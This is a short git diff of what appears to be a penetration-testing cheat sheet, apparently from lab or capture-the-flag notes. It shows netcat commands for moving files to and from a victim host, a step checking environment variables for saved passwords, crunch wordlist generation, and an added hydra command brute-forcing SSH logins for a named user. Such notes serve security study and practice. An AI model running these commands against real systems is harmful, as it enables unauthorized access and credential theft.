@@ -132,6 +132,8 @@ nc -nvlp <port> > <filename>
 nc -nv <victim-ip> <victim-port> < '<file/to/transfer>' 
 ```
 
+---
+
 **CHECK ENVIRONMENT VARIABLE FOR SAVED PASSWORDS**
 ```SHELL
 env
@@ -144,5 +146,9 @@ crunch 6 6 -t Lab%%% > wordlist
 
 **BRUTEFORCING SSH FOR HORIZONTAL ESCALATION**
 ```SHELL
-hydra 
+hydra -l eve -P wordlist <ip> -t 4 ssh -V 
 ```
+
+---
+
+
